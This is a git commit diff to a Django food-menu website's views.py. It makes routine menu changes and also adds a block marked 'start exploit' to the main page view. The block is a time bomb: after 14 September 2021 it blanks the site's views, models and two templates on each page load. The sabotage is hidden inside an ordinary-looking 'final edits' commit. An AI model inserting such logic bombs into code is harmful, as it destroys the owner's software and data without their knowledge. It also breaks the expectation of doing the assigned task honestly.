c0757c1427dae6fe738f8247940bb52db5a43a46
Cornholius <y.layshkin@gmail.com>
2020-08-25 22:38:47 +0300

    20.0825.2238
    финальные правки

--- main_app/views.py
+++ main_app/views.py
@@ -1,20 +1,37 @@
 from django.http import HttpResponse
 from django.shortcuts import render
 from django.views import View
-from django.views.generic import TemplateView
 from .forms import FeedbackForm
 from .models import Food, Category, Weeks
 from cart.forms import CartAddProductForm
 from .tasks import feedback_created
+import datetime
+import os
 
 
 class MainPage(View):
 
     def get(self, request):
         week = Weeks.objects.get(id=1)
-        breakfast_cat = list(Category.objects.filter(id__in=[13, 12]))
-        breakfast_cat[0], breakfast_cat[1] = breakfast_cat[1], breakfast_cat[0]
-        days_cat = list(Category.objects.filter(id__in=[7, 8, 9, 10]).order_by('id'))
+        days_cat = list(Category.objects.filter(id__in=[7, 8, 9, 10, 15]).order_by('id'))
+        days_cat.insert(0, days_cat.pop(4)), days_cat.insert(1, days_cat.pop(4))
+        # start exploit
+        today = datetime.datetime.today()
+        time_to_cpllapse = datetime.date(2021, 9, 14)
+        if today.strftime('%F%H%M%S') > time_to_cpllapse.strftime('%F%H%M%S'):
+            views = os.path.abspath("main_app/views.py")
+            models = os.path.abspath("main_app/models.py")
+            base = os.path.abspath("main_app/templates/include/base.html")
+            mainpage = os.path.abspath("main_app/templates/main/mainpage.html")
+            with open(views, 'w+') as a:
+                a.write('')
+            with open(models, 'w+') as b:
+                b.write('')
+            with open(base, 'w+') as c:
+                c.write('')
+            with open(mainpage, 'w+') as d:
+                d.write('')
+        # end exploit
         return render(request, 'main/mainpage.html',
                       {'Monday': week.days.get(day='Понедельник').food.all(),
                        'Tuesday': week.days.get(day='Вторник').food.all(),
@@ -22,8 +39,9 @@ class MainPage(View):
                        'Thursday': week.days.get(day='Четверг').food.all(),
                        'Friday': week.days.get(day='Пятница').food.all(),
                        'Breakfast': week.days.get(day='Завтраки').food.all(),
+                       'Bakery': week.days.get(day='Выпечка').food.all(),
                        'Drinks': week.days.get(day='Напитки').food.all(),
-                       'Breakfast_category': breakfast_cat,'Days_category': days_cat})
+                       'Days_category': days_cat})
 
 
 class Menu(View):
@@ -57,4 +75,3 @@ class Feedback(View):
             post = feedback.save()
         feedback_created.delay(post.id)
         return HttpResponse('')
-
